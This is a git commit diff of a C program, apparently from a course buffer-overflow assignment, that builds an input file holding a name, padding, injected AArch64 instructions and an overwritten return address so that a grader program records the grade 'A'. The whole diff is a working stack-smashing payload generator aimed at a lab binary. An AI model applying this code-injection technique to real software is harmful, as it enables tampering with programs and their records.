77bebfe812505f361d52396debc4f9908ddecdc8
Jeonghyun Shin <js9523@princeton.edu>
2024-12-09 22:06:15 -0500

    debug bus error

--- createdataA.c
+++ createdataA.c
@@ -14,29 +14,40 @@
  */
 int main() {
     FILE *psFile; 
-    unsigned int MOV, STRB, B; 
+    unsigned int MOV, STRB, ADR, B; 
+
+    const unsigned int returnAddress = 0x420078;
 
     /* write name and null terminator to file. 
     grader program will ... */ 
-    char name[] = "Claire Shin";
-    psFile = fopen("dataB", "wb");
+
+    psFile = fopen("dataA", "wb");
     if (psFile == NULL) {
         perror("Error opening file"); 
         return 1;  /* Return error code if file opening fails */
     }
-    fwrite(name, sizeof(char), sizeof(name) - 1, psFile);
+
+    fprintf(psFile, "%s", "Claire Shin"); 
 
     /* add padding so that buffer overflow can be performed 
-    48 - 11 (length of name)= 37. */ 
-    for (int i = 0; i < 37; i++) {
+    48 - 11 (length of name)= 37. 
+    Also have to leave 16 bytes for 4 lines of code */ 
+    for (int i = 0; i < 21; i++) {
         fputc(0x00, psFile);
     }
 
-    /* MOV grade A to register W0 using MiniAssembler */
-    MOV = MiniAssembler_mov(0, 'A');
+    /* MOV X0, 'A'
+    MOV grade A to register W0 using MiniAssembler */
+    MOV = MiniAssembler_mov(0, 65); /* ASCII code of A */
     fwrite(&MOV, sizeof(unsigned int), 1, psFile);
 
-    /* STR A in register W0 into the address pointed by X1
+    /* ADR X1, grade */
+    /* address of grade so that we can jump */
+    ADR = MiniAssembler_adr(1, 0x420044, 0x42007c);
+    fwrite(&ADR, sizeof(unsigned int), 1, psFile);
+
+    /* STRB W0, X1 
+    STR A in register W0 into the address pointed by X1
     branch back to normal program flow after setting grade to A */
     STRB = MiniAssembler_strb(0, 1);
     fwrite(&STRB, sizeof(unsigned int), 1, psFile);
@@ -44,8 +55,10 @@ int main() {
     /* B back to return address */ 
     /* 0x40087c is instruction address after getName returns
     0xffffffffea48 is the injected instruction address based on gdb */
-    B = MiniAssembler_b(0xffffffffea48, 0x40087c);
+    B = MiniAssembler_b(0x40089c, 0x420084);
     fwrite(&B, sizeof(unsigned int), 1, psFile);
+
+    fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);
 
     fclose(psFile);
     return 0;
